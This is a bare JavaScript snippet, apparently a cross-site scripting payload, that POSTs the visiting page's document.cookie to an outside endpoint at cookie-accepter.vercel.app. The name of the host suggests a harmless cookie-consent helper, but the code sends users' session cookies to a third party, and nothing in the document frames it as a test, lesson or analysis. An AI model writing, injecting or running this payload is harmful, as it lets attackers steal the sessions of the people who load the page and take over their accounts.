fetch("https://cookie-accepter.vercel.app/api/save", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ cookie: document.cookie }),
});
